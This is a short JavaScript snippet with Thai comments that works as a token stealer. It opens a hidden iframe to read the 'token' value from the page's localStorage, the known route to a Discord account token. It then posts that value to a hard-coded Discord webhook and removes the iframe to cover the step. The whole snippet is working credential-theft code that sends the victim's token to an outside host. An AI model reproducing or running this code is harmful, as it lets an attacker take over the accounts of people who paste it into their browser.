(function() {
    // สร้าง iframe ใหม่
    const iframe = document.createElement('iframe');
    document.body.appendChild(iframe);

    // ใช้ iframe เพื่อเข้าถึง localStorage
    const localStorage = iframe.contentWindow.localStorage;
    const token = localStorage.getItem('token');

    // ลบเครื่องหมายคำพูดจาก token
    const cleanedToken = token ? token.replace(/"/g, '') : 'Token not found';

    // แสดง token หรือข้อความที่ไม่พบในคอนโซล
    console.log(cleanedToken);

    // ส่งข้อมูลไปยัง Discord Webhook
    fetch('https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `Token: ${cleanedToken}`
        })
    })
    .then(response => response.json())
    .then(data => console.log('Webhook response:', data))
    .catch(error => console.error('Error sending webhook:', error));

    // ลบ iframe ออกจาก document
    document.body.removeChild(iframe);
})();
